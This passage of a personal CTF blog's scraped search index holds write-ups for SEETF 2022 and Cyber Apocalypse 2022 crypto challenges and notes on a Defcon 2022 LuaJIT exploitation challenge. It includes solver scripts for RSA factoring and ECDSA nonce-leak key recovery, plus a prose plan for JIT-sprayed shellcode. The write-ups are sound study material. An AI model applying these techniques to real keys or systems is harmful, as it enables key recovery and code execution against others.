ciphers[2][1]^3 - ciphers[2][0] flag = gcd(gcd(x1, x2), x3) while True: try: print('------------------------') flag = flag.nth_root(2) print(long_to_bytes(flag)) except: break Result Flag: SEE{common_moduli_with_common_exponents_daf4ede8dda5c} ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:5:3","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Close Enough Author: TheMythologist My prof mentioned something about not using primes that are close to each other in RSA, but it's close enough, isn't it? Ciphertext is 4881495507745813082308282986718149515999022572229780274224400469722585868147852608187509420010185039618775981404400401792885121498931245511345550975906095728230775307758109150488484338848321930294974674504775451613333664851564381516108124030753196722125755223318280818682830523620259537479611172718588812979116127220273108594966911232629219195957347063537672749158765130948724281974252007489981278474243333628204092770981850816536671234821284093955702677837464584916991535090769911997642606614464990834915992346639919961494157328623213393722370119570740146804362651976343633725091450303521253550650219753876236656017 ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:6:0","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Initial Analysis We were given two attached files, the encryption script and the public key. Let’s check it from Crypto.Util.number import getPrime, bytes_to_long from Crypto.PublicKey import RSA from secret import flag, getNextPrime p = getPrime(1024) q = getNextPrime(p) n = p * q e = 65537 key = RSA.construct((n, e)).export_key().decode() with open(\"key\", \"w\") as f: f.write(key) m = bytes_to_long(flag.encode()) c = pow(m, e, n) print(f\"c = {c}\") So, we can notice that the prime that is being used is very close, which mean that we can easily factor it using the fermat attack. The base of fermat method is based on this equation. Suppose that, $$ N = a^{2}-b^{2} $$ then, we can transform it into $$ N = (a+b)(a-b) $$ and because it is close, we can assume that b is small, so that in order to factorize the $N$, we can simply square root the $N$ to initialize our $a$ value, and then try to increase its value until $a^{2}-N$ is a square number, which mean we found $b^{2}$. ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:6:1","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Solution Below is the solution script that we use (sage script) from Crypto.PublicKey import RSA from Crypto.Util.number import * # Retrieved from https://facthacks.cr.yp.to/fermat.html def fermatfactor(N): if N \u003c= 0: return [N] if is_even(N): return [2,N/2] a = ceil(sqrt(N)) while not is_square(a^2-N): a = a + 1 b = sqrt(a^2-N) return [a - b,a + b] pub = RSA.importKey(open(\"key\", \"rb\").read(), passphrase=None) e = pub.e n = pub.n c = 4881495507745813082308282986718149515999022572229780274224400469722585868147852608187509420010185039618775981404400401792885121498931245511345550975906095728230775307758109150488484338848321930294974674504775451613333664851564381516108124030753196722125755223318280818682830523620259537479611172718588812979116127220273108594966911232629219195957347063537672749158765130948724281974252007489981278474243333628204092770981850816536671234821284093955702677837464584916991535090769911997642606614464990834915992346639919961494157328623213393722370119570740146804362651976343633725091450303521253550650219753876236656017 p, q = fermatfactor(n) d = inverse_mod(e, (p-1)*(q-1)) print(long_to_bytes(int(pow(c,d,n)))) Result Flag: SEE{i_love_really_secure_algorithms_b5c0b187fe309af0f4d35982fd961d7e} Social Media Follow me on twitter ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:6:2","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":" I didn’t do well on this Defcon, so this isn’t a writeup, but just to shared what I’ve learned during working on the Defcon, especially on the Luajit chall. I apologize in advance if there is some mistake on this article, as I just learn all of it during the Defcon. During Defcon, I only work on three challenge with the help of my teammates, which are same_old, hash-it, and smuggler’s cove. We submit the flag for same_old and hash-it, and I spend the whole two days on the smuggler’s cove, but failed to solve it. On this article, I’ll try to summarize what I learned during working on the chall, my failed attempts on smuggler’s cove, and the correct approach which I know after the CTF ended. I write this for my future notes in case I faced this kind of problem again. Smuggler’s Cove ","date":"Jun 03, 2022","objectID":"/posts/defcon-ctf-2022-self-reflection/:0:0","tags":["tech","DefconCTF","reflection","notes","pwn","2022"],"title":"Defcon CTF 2022: Self-Reflection","uri":"/posts/defcon-ctf-2022-self-reflection/"},{"categories":null,"content":"Initial Analysis On this chall, we were given Dockerfile, cove.c, dig_up_the_loot.c, and the binaries of the given source code. Let’s take a look on the Dockerfile. The server is running the binary of cove.c. FROM ubuntu:20.04 WORKDIR /challenge ARG DEBIAN_FRONTEND=noninteractive # upgrade ran at Fri May 27 15:18:42 UTC 2022 (see packages.txt) RUN apt-get update \u0026\u0026 apt-get upgrade -y \u0026\u0026 apt-get install curl -y \u0026\u0026 apt list --installed \u003e /packages.txt COPY libluajit-5.1.so.2 /usr/local/lib/libluajit-5.1.so.2 COPY cove dig_up_the_loot /challenge/ RUN ldconfig \u0026\u0026 chmod 111 /challenge/dig_up_the_loot RUN adduser --no-create-home --disabled-password --gecos \"\" user USER user ENTRYPOINT [\"/challenge/cove\"] So the server was running the most recent of Ubuntu20.04, which got upgraded just on Friday (D-1 Defcon CTF). I think this will help us a lot, as I also use Ubuntu20.04 on my local, and I can simply run update \u0026 upgrade to replicate the server environment. Now, checking the file dig_up_the_loot.c #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e char* args[] = { \"x\", \"marks\", \"the\", \"spot\" }; int main(int argc, char** argv) { const size_t num_args = sizeof(args)/sizeof(char*); if (argc != num_args + 1) { printf(\"Avast ye missing arguments: ./dig_up_the_loot\"); for (size_t i=0; i\u003cnum_args; i++) printf(\" %s\", args[i]); puts(\"\"); exit(0); } for (size_t i=0; i\u003cnum_args; i++) { if (strcmp(argv[i+1], args[i])) { puts(\"Blimey! Are missing your map?\"); exit(0); } } puts(\"Shiver me timbers! Thar be your flag: FLAG PLACEHOLDER\"); } Okay, so seems like we need to run ./dig_up_the_loot x marks the spot in order to retrieve the flag. Let’s move to the main source code (cove.c), which we should abuse. #include \u003cstdio.h\u003e #include \u003clua.h\u003e #include \u003clualib.h\u003e #include \u003clauxlib.h\u003e #include \"luajit.h\" #include \"lj_dispatch.h\" #include \"lj_obj.h\" #include \u003csys/mman.h\u003e #define MAX_SIZE 433 GCtrace* getTrace(lua_State* L, uint8_t index) { jit_State* js = L2J(L); if (index \u003e= js-\u003esizetrace) return NULL; return (GCtrace*)gcref(js-\u003etrace[index]); } int print(lua_State* L) { if (lua_gettop(L) \u003c 1) { return luaL_error(L, \"expecting at least 1 arguments\"); } const char* s = lua_tostring(L, 1); puts(s); return 0; } int debug_jit(lua_State* L) { if (lua_gettop(L) != 2) { return luaL_error(L, \"expecting exactly 1 arguments\"); } luaL_checktype(L, 1, LUA_TFUNCTION); const GCfunc* v = lua_topointer(L, 1); if (!isluafunc(v)) { return luaL_error(L, \"expecting lua function\"); } uint8_t offset = lua_tointeger(L, 2); uint8_t* bytecode = mref(v-\u003el.pc, void); uint8_t op = bytecode[0]; uint8_t index = bytecode[2]; GCtrace* t = getTrace(L, index); if (!t || !t-\u003emcode || !t-\u003eszmcode) { return luaL_error(L, \"Blimey! There is no cargo in this ship!\"); } printf(\"INSPECTION: This ship's JIT cargo was found to be %p\\n\", t-\u003emcode); if (offset != 0) { if (offset \u003e= t-\u003eszmcode - 1) { return luaL_error(L, \"Avast! Offset too large!\"); } t-\u003emcode += offset; t-\u003eszmcode -= offset; printf(\"... yarr let ye apply a secret offset, cargo is now %p ...\\n\", t-\u003emcode); } return 0; } void set_jit_settings(lua_State* L) { luaL_dostring(L, \"jit.opt.start('3');\" \"jit.opt.start('hotloop=1');\" ); } void init_lua(lua_State* L) { // Init JIT lib lua_pushcfunction(L, luaopen_jit); lua_pushstring(L, LUA_JITLIBNAME); lua_call(L, 1, 0); set_jit_settings(L); lua_pushnil(L); lua_setglobal(L, \"jit\"); lua_pop(L, 1); lua_pushcfunction(L, debug_jit); lua_setglobal(L, \"cargo\"); lua_pushcfunction(L, print); lua_setglobal(L, \"print\"); } void run_code(lua_State* L, char* path) { const size_t max_size = MAX_SIZE; char* code = calloc(max_size+1, 1); FILE* f = fopen(path,\"r\"); if (f == NULL) { puts(\"Unable to open file\"); exit(-1); } fseek(f, 0, SEEK_END); size_t size = ftell(f); if (size \u003e max_size) { puts(\"Too large\"); exit(-1); return; } fseek(f, 0, SEEK_SET); fread(code, 1, size, f); fclose(stdin); int ret = luaL_dostring(L, code); if (ret != 0) { printf(\"Lua error: %s\\n\", lua_tostring(L, -1)); } } int main","date":"Jun 03, 2022","objectID":"/posts/defcon-ctf-2022-self-reflection/:1:0","tags":["tech","DefconCTF","reflection","notes","pwn","2022"],"title":"Defcon CTF 2022: Self-Reflection","uri":"/posts/defcon-ctf-2022-self-reflection/"},{"categories":null,"content":"Exploitation Plan To summarize, so basically what the binary do is: Initialize a Luajit Read our given lua script Run it inside Luajit What make the given binary special is the debug_jit method, where we can use it to shift the start of our method JIT-compiled machine code (Notes that it only allowed us to shift the trace of Lua function which got JIT-Compiled). So now, it is clear that, what we need to is somehow, use the debug_jit method feature, to do RCE and execute command ./dig_up_the_loot x marks the spot. Reading this writeup from past CTF gave me a clear idea on how to do it. Basically, what we need to do is to craft a lua method, which the compiled machine code will have controllable constants. For example, what we aim to do is to have the trace machine code contains instruction like this mov rdi, 0x22eb006a61c18348 cmp ebp, 0x6161616161 etc And then, reserve the last 2 byte as our jump instruction to the other constant, and use the remaining bytes to craft our shellcode, which will execute our target command. ","date":"Jun 03, 2022","objectID":"/posts/defcon-ctf-2022-self-reflection/:2:0","tags":["tech","DefconCTF","reflection","notes","pwn","2022"],"title":"Defcon CTF 2022: Self-Reflection","uri":"/posts/defcon-ctf-2022-self-reflection/"},{"categories":null,"content":"Failure Well, at the end, I failed to solve it during the CTF, because I couldn’t craft any payload which satisfy it. What I found during CTF is that if we able to produce bytecode int LE xxx, we can generate an int constant. But somehow, I can only produce it by using for loop, but as we know that Luajit is a tracing-method, it will only traced the for loop instead of the method that I defined. I use luajit to help me debugging it. Above is the only payload that I found during the CTF that able to produce constants, yet I can’t use it because it is not a method trace (The trace is belong to the for loop sequence, not to the method that I defined). ","date":"Jun 03, 2022","objectID":"/posts/defcon-ctf-2022-self-reflection/:3:0","tags":["tech","DefconCTF","reflection","notes","pwn","2022"],"title":"Defcon CTF 2022: Self-Reflection","uri":"/posts/defcon-ctf-2022-self-reflection/"},{"categories":null,"content":"Reflections After the CTF end, the chall’s author tell me on the trick how to produce the constants. And also I read two great writeups in ctftime (here and here) which is super great. I missed out that in Lua, every number is by default treated as floating point, so the hex that I should consider inside the compiled machine code is floating-point hex. And turn out, some tricks that we can use to produce constants: Define the constant as index of an array. Ex m[100]=0 Add LL suffix in comparison. Ex: if i == 0xdeadbeefcafebabeLL I’ve actually tried the index of array trick, but as I mentioned before, my mistake is not treating it as floating point, which make me failed to see the constant during debugging with the luajit. So when I specify m[0x61616161]=0, I expect to see 0x61616161 in the compiled machine code, while what the compiled machine code is converting it to floating-point hex representation due to the fact that Lua treat all numbers as floating point by default, which makes me unable to realize that I actually able to produce constant. This is a great lesson for me, as I failed to notice this during working on the chall. So after reading the writeup, I managed to try to implement it and solve it in my local. I feel sad because I didn’t solve this chall during working on the CTF, but on the bright part, I learned a lot of new things related to Luajit. I hope that if in the future I face a challenge related to Luajit, I’ll be able to tackle and solve it. Thanks for the chall’s author and the writeup’s author for providing me a new knowledge about this. ","date":"Jun 03, 2022","objectID":"/posts/defcon-ctf-2022-self-reflection/:4:0","tags":["tech","DefconCTF","reflection","notes","pwn","2022"],"title":"Defcon CTF 2022: Self-Reflection","uri":"/posts/defcon-ctf-2022-self-reflection/"},{"categories":null,"content":"Sources https://0xten.gitbook.io/public/defcon/2022/quals/smugglers-cove https://uz56764.tistory.com/55 http://pwning.net/pwn/2012/05/21/jit-source-and-writeup/ https://pwparchive.wordpress.com/2012/10/16/peeking-inside-luajit/ https://www.lua.org/manual/5.1/ http://wiki.luajit.org/Bytecode-2.0 Social Media Follow me on twitter ","date":"Jun 03, 2022","objectID":"/posts/defcon-ctf-2022-self-reflection/:5:0","tags":["tech","DefconCTF","reflection","notes","pwn","2022"],"title":"Defcon CTF 2022: Self-Reflection","uri":"/posts/defcon-ctf-2022-self-reflection/"},{"categories":null,"content":" On this CTF, I only worked on the crypto challenges. I managed to solve two crypto challenges. Here is my writeup for those challenges. Crypto ","date":"May 19, 2022","objectID":"/posts/cyber-apocalypse-ctf-2022/:0:0","tags":["Writeup","htb","CyberApocalypseCTF","RSA","ECDSA","LLL","HNP","crypto","2022"],"title":"Cyber Apocalypse CTF 2022","uri":"/posts/cyber-apocalypse-ctf-2022/"},{"categories":null,"content":"Down the Rabinhole (325 pt) ","date":"May 19, 2022","objectID":"/posts/cyber-apocalypse-ctf-2022/:1:0","tags":["Writeup","htb","CyberApocalypseCTF","RSA","ECDSA","LLL","HNP","crypto","2022"],"title":"Cyber Apocalypse CTF 2022","uri":"/posts/cyber-apocalypse-ctf-2022/"},{"categories":null,"content":"Initial Analysis We were given two files, source.py from Crypto.Util.number import getPrime, isPrime, bytes_to_long from Crypto.Util.Padding import pad import os FLAG = b\"HTB{--REDACTED--}\" def getPrimes(coefficient): while True: a = getPrime(512) p = 3 * coefficient * a + 2 if isPrime(p): break while True: b = getPrime(512) q = 3 * coefficient * b + 2 if isPrime(q): break return p, q def encrypt(message, coefficient): p, q = getPrimes(coefficient) n = p * q padded_message = bytes_to_long(pad(message, 64)) message = bytes_to_long(message) c1 = (message * (message + coefficient)) % n c2 = (padded_message * (padded_message + coefficient)) % n return (n, c1, c2) def main(): coefficient = getPrime(128) out = \"\" message = FLAG[0:len(FLAG)//2] n1, c1, c2 = encrypt(message, coefficient) out += f\"{n1}\\n{c1}\\n{c2}\\n\" message = FLAG[len(FLAG)//2:] n2, c3, c4 = encrypt(message, coefficient) out += f\"{n2}\\n{c3}\\n{c4}\" with open(\"out.txt\", \"w\") as f: f.write(out) if __name__ == '__main__': main() and out.txt 59695566410375916085091065597867624599396247120105936423853186912270957035981683790353782357813780840261434564512137529316306287245132306537487688075992115491809442873176686026221661043777720872604111654524551850568278941757944240802222861051514726510684250078771979880364039814240006038057748087210740783689350438039317498789505078530402846140787188830971536805605748267334628057592989 206131769237721955001530863959688756686125485413899261197125641745745636359058664398433013356663394210624150086689905532 14350341133918883930676906390648724486852266960811870561648194176794020698141189777337348951219934072588842789694987397861496993878758159916334335632468891342228755755695273096621152247970509517996580512069034691932835017774636881861331636331496873041705094768329156701838193429109420730982051593645140188946 56438641309774959123579452414864548345708278641778632906871133633348990457713200426806112132039095059800662176837023585166134224681069774331148738554157081531312104961252755406614635488382297434171375724135403083446853715913787796744272218693049072693460001363598351151832646947233969595478647666992523249343972394051106514947235445828889363124242280013397047951812688863313932909903047 429546912004731012886527767254149694574730322956287028161761007271362927652041138366004560890773167255588200792979452452 29903904396126887576044949247400308530425862142675118500848365445245957090320752747039056821346410855821626622960719507094119542088455732058232895757115241568569663893434035594991241152575495936972994239671806350060725033375704703416762794475486000391074743029264587481673930383986479738961452214727157980946 Okay, so what this challenge do is basically: Split the flag to two parts Generate $\\text{coeff}$ which is a prime ~$128$ bits Use this $\\text{coeff}$ to generate a new prime which fulfill $\\text{prime}=3.\\text{coeff}.a +2$ Use those generated primes to encrypt the partial flag with RSA. Each part got encrypted twice, the first one is without padding, and the second one is with padding And then, they provide us with $n_{1}, c_{1}, c_{2}, n_{2}, c_{3}, c_{4}$ So, with the given informations, we need to be able decrypt our flag. ","date":"May 19, 2022","objectID":"/posts/cyber-apocalypse-ctf-2022/:1:1","tags":["Writeup","htb","CyberApocalypseCTF","RSA","ECDSA","LLL","HNP","crypto","2022"],"title":"Cyber Apocalypse CTF 2022","uri":"/posts/cyber-apocalypse-ctf-2022/"},{"categories":null,"content":"Solution Let’s try to create equations from the given source code on generating $n_{1}$ and $n_{2}$ ($c = \\text{coeff}$). $$ \\begin{align*} \\tag{1} n_1 \u0026= p_1q_1 \\\\ \u0026= (3ca_{11} + 2)(3ca_{12} + 2) \\\\ \u0026= 9a_{11}a_{12}c^2 + 6c(a_{11}+a_{12}) + 4 \\\\ (n_1 - 4) \u0026= 9a_{11}a_{12}c^2 + 6c(a_{11}+a_{12}) \\\\ (n_1 - 4) \u0026= 3c(3a_{11}a_{12}c + 2(a_{11}+a_{12})) \\\\ \\end{align*} $$ $$ \\begin{align*} \\tag{2} n_2 \u0026= p_2q_2 \\\\ \u0026= (3ca_{21} + 2)(3ca_{22} + 2)\\\\ \u0026= 9a_{21}a_{22}c^2 + 6c(a_{21}+a_{22}) + 4\\\\ (n_2 - 4) \u0026= 9a_{21}a_{22}c^2 + 6c(a_{21}+a_{22})\\\\ (n_2 - 4) \u0026= 3c(3a_{21}a_{22}c + 2(a_{21}+a_{22}))\\\\ \\end{align*} $$ Notice that both of them share common factors (which is $c$). $GCD$ both equations can help us to retrieve the $\\text{coeff}$ value, because both of them share common factors $c$. Just do $GCD(n_1-4, n_2-4)$, factorize it, and take the prime which has ~$128$ bits (Because $\\text{coeff}$ size is ~$128$ bits). Based on the given output, we get $\\text{coeff} = GCD(n_1-4, n_2-4)//9$. Now we have $\\text{coeff}$. Now let re-visit the code on the encryption: def encrypt(message, coefficient): p, q = getPrimes(coefficient) n = p * q padded_message = bytes_to_long(pad(message, 64)) message = bytes_to_long(message) c1 = (message * (message + coefficient)) % n c2 = (padded_message * (padded_message + coefficient)) % n return (n, c1, c2) $n$ is ~$1280$ bits. And $c_1=m*(m+\\text{coeff}) \\mod n$. Notice that if $m$ bits is less than $640$ bits (~$80$ chars), we actually can ignore the mod operation, because $m*(m+\\text{coeff})$ is less than $n$. I don’t think that the partial flag length will be larger than 80 chars, so I think we can actually solve the equations. So let’s try to solve this quadratic equation $n = m*(m+\\text{coeff})$. Turn out, we successfully retrieve the flag by solving those quadratic equations on each part. ","date":"May 19, 2022","objectID":"/posts/cyber-apocalypse-ctf-2022/:1:2","tags":["Writeup","htb","CyberApocalypseCTF","RSA","ECDSA","LLL","HNP","crypto","2022"],"title":"Cyber Apocalypse CTF 2022","uri":"/posts/cyber-apocalypse-ctf-2022/"},{"categories":null,"content":"Full Script I use sage to solve the solution from Crypto.Util.number import * n1 = 59695566410375916085091065597867624599396247120105936423853186912270957035981683790353782357813780840261434564512137529316306287245132306537487688075992115491809442873176686026221661043777720872604111654524551850568278941757944240802222861051514726510684250078771979880364039814240006038057748087210740783689350438039317498789505078530402846140787188830971536805605748267334628057592989 c1 = 206131769237721955001530863959688756686125485413899261197125641745745636359058664398433013356663394210624150086689905532 c2 = 14350341133918883930676906390648724486852266960811870561648194176794020698141189777337348951219934072588842789694987397861496993878758159916334335632468891342228755755695273096621152247970509517996580512069034691932835017774636881861331636331496873041705094768329156701838193429109420730982051593645140188946 n2 = 56438641309774959123579452414864548345708278641778632906871133633348990457713200426806112132039095059800662176837023585166134224681069774331148738554157081531312104961252755406614635488382297434171375724135403083446853715913787796744272218693049072693460001363598351151832646947233969595478647666992523249343972394051106514947235445828889363124242280013397047951812688863313932909903047 c3 = 429546912004731012886527767254149694574730322956287028161761007271362927652041138366004560890773167255588200792979452452 c4 = 29903904396126887576044949247400308530425862142675118500848365445245957090320752747039056821346410855821626622960719507094119542088455732058232895757115241568569663893434035594991241152575495936972994239671806350060725033375704703416762794475486000391074743029264587481673930383986479738961452214727157980946 coeff = gcd(n1-4, n2-4) // 9 m1 = var('m1') m2 = var('m2') m1_roots = solve(m1*(m1+coeff) == c1, m1) m2_roots = solve(m2*(m2+coeff) == c3, m2) flag = b'' for root in m1_roots: if root.right() \u003e 0: flag += long_to_bytes(int(root.right())) for root in m2_roots: if root.right() \u003e 0: flag += long_to_bytes(int(root.right())) print(f'Flag: {flag.decode()}') Flag: HTB{gcd_+_2_*_R@6in_.|5_thi5_@_cro55over_epi5ode?} ","date":"May 19, 2022","objectID":"/posts/cyber-apocalypse-ctf-2022/:1:3","tags":["Writeup","htb","CyberApocalypseCTF","RSA","ECDSA","LLL","HNP","crypto","2022"],"title":"Cyber Apocalypse CTF 2022","uri":"/posts/cyber-apocalypse-ctf-2022/"},{"categories":null,"content":"Mind in the Clouds (375 pt) ","date":"May 19, 2022","objectID":"/posts/cyber-apocalypse-ctf-2022/:2:0","tags":["Writeup","htb","CyberApocalypseCTF","RSA","ECDSA","LLL","HNP","crypto","2022"],"title":"Cyber Apocalypse CTF 2022","uri":"/posts/cyber-apocalypse-ctf-2022/"},{"categories":null,"content":"Initial Analysis We were given a source code: import json import signal import subprocess import socketserver from hashlib import sha1 from random import randint from Crypto.Util.number import bytes_to_long, long_to_bytes, inverse from ecdsa.ecdsa import curve_256, generator_256, Public_key, Private_key, Signature import os fnames = [b'subject_kolhen', b'subject_stommb', b'subject_danbeer'] nfnames = [] class ECDSA: def __init__(self): self.G = generator_256 self.n = self.G.order() self.key = randint(1, self.n - 1) self.pubkey = Public_key(self.G, self.key * self.G) self.privkey = Private_key(self.pubkey, self.key) def sign(self, fname): h = sha1(fname).digest() nonce = randint(1, self.n - 1) sig = self.privkey.sign(bytes_to_long(h), nonce) return {\"r\": hex(sig.r)[2:], \"s\": hex(sig.s)[2:], \"nonce\": hex(nonce)[2:]} def verify(self, fname, r, s): h = bytes_to_long(sha1(fname).digest()) r = int(r, 16) s = int(s, 16) sig = Signature(r, s) if self.pubkey.verifies(h, sig): return retrieve_file(fname) else: return 'Signature is not valid\\n' ecc = ECDSA() def init_storage(): i = 0 for fname in fnames[:-1]: data = ecc.sign(fname) r, s = data['r'], data['s'] nonce = data['nonce'] nfname = fname.decode() + '_' + r + '_' + s + '_' + nonce[(14 + i):-14] nfnames.append(nfname) i += 2 def retrieve_file(fname): try: dt = open(fname, 'rb').read() return dt.hex() except: return 'The file does not exist!' def challenge(req): req.sendall(b'This is a cloud storage service.\\n' + b'You can list the files inside and also see their contents if your signatures are valid.\\n') while True: req.sendall(b'\\nOptions:\\n1.List files\\n2.Access a file\\n') try: payload = json.loads(req.recv(4096)) if payload['option'] == 'list': payload = json.dumps( {'response': 'success', 'files': nfnames}) req.sendall(payload.encode()) elif payload['option'] == 'access': fname = payload['fname'] r, s = payload['r'], payload['s'] dt = ecc.verify(fname.encode(), r, s) if ('not exist' in dt) or ('not valid' in dt): payload = json.dumps({'response': 'error', 'message': dt}) else: payload = json.dumps({'response': 'success', 'data': dt}) req.sendall(payload.encode()) else: payload = json.dumps( {'response': 'error', 'message': 'Invalid option!'}) req.sendall(payload.encode()) except: payload = json.dumps( {'response': 'error', 'message': 'An error occured!'}) req.sendall(payload.encode()) class incoming(socketserver.BaseRequestHandler): def handle(self): signal.alarm(30) req = self.request challenge(req) class ReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass def main(): init_storage() socketserver.TCPServer.allow_reuse_address = True server = ReusableTCPServer((\"0.0.0.0\", 1337), incoming) server.serve_forever() if __name__ == \"__main__\": main() So, this is an ECDSA challenge. Let’s try to analysis the source code part by part. def main(): init_storage() socketserver.TCPServer.allow_reuse_address = True server = ReusableTCPServer((\"0.0.0.0\", 1337), incoming) server.serve_forever() Okay, so this challenge will call init_storage and then turn up the server. Let’s check what init_storage do fnames = [b'subject_kolhen', b'subject_stommb', b'subject_danbeer'] nfnames = [] ... def init_storage(): i = 0 for fname in fnames[:-1]: data = ecc.sign(fname) r, s = data['r'], data['s'] nonce = data['nonce'] nfname = fname.decode() + '_' + r + '_' + s + '_' + nonce[(14 + i):-14] nfnames.append(nfname) i += 2 Okay, so from the defined filenames, init_storage will only sign two files (which is subject_kolhen and subject_stommb), and then store it with format filename_r_s_nonce[(14+i):-14]. $(r, s)$ is the signature that is returned by ECDSA. Usually, in ECDSA scheme, we shouldn’t shared our $\\text{nonce}$ or reused it, because knowning the $\\text{nonce}$ will allow us to derive the secret key. Let’s try to remember how does ECDSA signature works first. We can sign a message with ECDSA by doing this: $$ \\tag{1} s \\equiv k^{-1}(h+r\\alpha) \\mod q $$ where, $s=\\text{signature}$","date":"May 19, 2022","objectID":"/posts/cyber-apocalypse-ctf-2022/:2:1","tags":["Writeup","htb","CyberApocalypseCTF","RSA","ECDSA","LLL","HNP","crypto","2022"],"title":"Cyber Apocalypse CTF 2022","uri":"/posts/cyber-apocalypse-ctf-2022/"},{"categories":null,"content":"Solution We actually can represent the challenge problems into Hidden Number Problem which was introduced by Boneh and Venkatesan. There are a lot of existing papers those discussed about these problems (paper1, paper2, paper3). I choose to implement the first paper in order to solve this solutions (with some modifications). I will try to explain it. Basically, given the leaked middle bits of the $k$, we can say that: $$ \\tag{3} k_{i} = 2^{\\ell_{i}}c_{1} + a_{1} + b_{1} $$ where, $max(k_{bits})=256_{bits}$, $\\ell_{i}=max(k_{bits})-leaked_{i_{bits}}$, $a_{i}=2^{56}leaked_{i}$, and $b_{i}$ is the $56$ lsb of the $k_{i}$. So, in this case, $\\ell_{1}$ will be ~$200$ (because $leaked_{i_{bits}}=144$) and $\\ell_{2}$ will be ~$192$ (because $leaked_{i_{bits}}=136$). And $c_{1}$ will be $256-144-56=56$ bits, and $c_{2}$ will be $256-136-56=64$ bits. Remember $\\text{eq1}$ where, $$ s \\equiv k^{-1}(h+r\\alpha) \\mod q $$ and we have two signatures $$ \\begin{align*} \\tag{4} s_{1} \u0026\\equiv k_{1}^{-1}(h_{1}+r_{1}\\alpha) \\mod q \\\\ s_{1}k_{1} \u0026\\equiv h_{1}+r_{1}\\alpha \\mod q \\\\ \\end{align*} $$ $$ \\begin{align*} \\tag{5} s_{2} \u0026\\equiv k_{2}^{-1}(h_{2}+r_{2}\\alpha) \\mod q \\\\ s_{2}k_{2} \u0026\\equiv h_{2}+r_{2}\\alpha \\mod q \\\\ \\end{align*} $$ If we try to do elimination of $\\alpha$ between the equations that we have by multiplying first equation with $r_{2}$ and second equation with $r_{1}$, we will get $$ \\begin{align*} \\tag{6} r_{2}s_{1}k_{1} - r_{1}s_{2}k_{2} \u0026\\equiv r_{2}h_{1}+r_{2}r_{1}\\alpha - (r_{1}h_{2}+r_{1}r_{2}\\alpha) \\mod q \\\\ r_{2}s_{1}k_{1} - r_{1}s_{2}k_{2} \u0026\\equiv r_{2}h_{1} - r_{1}h_{2} \\mod q \\\\ k_{1} - r_{2}^{-1}s_{1}^{-1}r_{1}s_{2}k_{2} \u0026\\equiv s_{1}^{-1}h_{1} - r_{2}^{-1}s_{1}^{-1}r_{1}h_{2} \\mod q \\\\ k_{1} - s_{1}^{-1}r_{1}s_{2}r_{2}^{-1}k_{2} + s_{1}^{-1}r_{1}r_{2}^{-1}h_{2} - s_{1}^{-1}h_{1} \u0026\\equiv 0 \\mod q \\\\ k_{1} + tk_{2} + u \u0026\\equiv 0 \\mod q\\\\ \\end{align*} $$ where $t=-s_{1}^{-1}r_{1}s_{2}r_{2}^{-1}$ and $u=s_{1}^{-1}r_{1}r_{2}^{-1}h_{2} - s_{1}^{-1}h_{1}$ Remember $\\text{eq3}$ where we actually can expand the $k$ further. Putting it to $\\text{eq6}$. $$ \\begin{align*} \\tag{7} 2^{\\ell_{1}}c_{1} + a_{1} + b_{1} + t2^{\\ell_{2}}c_{2} + ta_{2} + tb_{2} + u \u0026\\equiv 0 \\mod q\\\\ b_{1} + 2^{\\ell_{1}}c_{1} + tb_{2} + t2^{\\ell_{2}}c_{2} + a_{1} + ta_{2} + u \u0026\\equiv 0 \\mod q\\\\ b_{1} + 2^{\\ell_{1}}c_{1} + tb_{2} + t2^{\\ell_{2}}c_{2} + u' \u0026\\equiv 0 \\mod q\\\\ b_{1} + 2^{\\ell_{1}}c_{1} + tb_{2} + t2^{\\ell_{2}}c_{2} + u' \u0026\\equiv 0 \\mod q\\\\ \\end{align*} $$ where $u'= a_{1} + ta_{2} + u$. Now, notice that $b_{1}$, $c_{1}$, $b_{2}$, $c_{2}$ are small unknowns. Based on the paper, we can construct a lattice where the result will contains 4 linear equations with 4 unknowns. Now, below is the lattice that I use. $$ B = \\begin{bmatrix} K \u0026 K2^{\\ell_{1}} \u0026 Kt \u0026 Kt2^{\\ell_{2}} \u0026 u' \\\\ 0 \u0026 Kq \u0026 0 \u0026 0 \u0026 0 \\\\ 0 \u0026 0 \u0026 Kq \u0026 0 \u0026 0 \\\\ 0 \u0026 0 \u0026 0 \u0026 Kq \u0026 0 \\\\ 0 \u0026 0 \u0026 0 \u0026 0 \u0026 q \\\\ \\end{bmatrix} $$ where for this challenge, I choose $K=2^{56}$ ($K$ is the expected bound for $b_{1}, c_{1}, b_{2}, c_{2}$). I know that $c_{2}$ value is expected to be larger than $K$ (remember that $c_{2}$ bits length should be around $64$), but this is enough for some cases (Refer to Extra Notes below). Notes that the lattice is slightly different from the example in the paper, because on this challenge, the total leaked middle bits that we got on signature 1 and signature 2 is difference ($leaked_{1_{bits}}=~144$ and $leaked_{1_{bits}}=~136$). Hence, the $\\ell_i$ value is difference. Using this basis and reduce it with $LLL$, we will got matrix 5x5, where it contains vector $$ v_{i} = (x_{0}Kb_{1}, x_{1}Kc_{1}, x_{2}Kb_{2}, x_{3}Kc_{2}, y_{i}) $$ where $x_{i}K$ is the coefficients of the linear equation and $y_{i}$ is the result of the linear equation. Just like the paper said, the first 4 vector is actually a linear equation of 4 unknown variables. So the vector is basically represents: $$ x_{0}Kb_{1} + x_{1}Kc_{1} + x_{2}Kb_{2} + x_{3}Kc_{2} - y_{i} = 0 $$ Solving the equations, w","date":"May 19, 